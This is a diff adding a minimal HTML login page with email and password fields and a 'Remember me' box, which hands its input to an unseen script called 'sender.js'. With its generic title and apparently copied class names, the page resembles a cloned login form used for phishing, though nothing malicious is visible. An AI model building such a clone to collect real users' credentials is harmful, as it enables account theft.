@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="style.css">
+        <!-- <script defer src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> -->
+        <script defer src="sender.js"></script>
+        <title>Website</title>
+    </head>
+
+    <body>
+        <div class="form">
+            <form>
+                <input name="login" id="email" type="text" placeholder="Login (email)" class="login-input" required="">
+                <input name="password" id="password" type="password" placeholder="Password" class="password-input"
+                    required="">
+                <div class="login-actions">
+                    <div class="login-remember">
+                        <label class="login-remember-me">
+                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
+                            <span style="line-height: 22px; height: 22px;">Remember me</span>
+                        </label>
+                    </div>
+                    <a href="#" class="login-forgot-password jGaTracking">Forgot password?</a>
+                </div>
+                <input type="submit" value="Login" id="btn">
+            </form>
+        </div>
+    </body>
+
+</html>
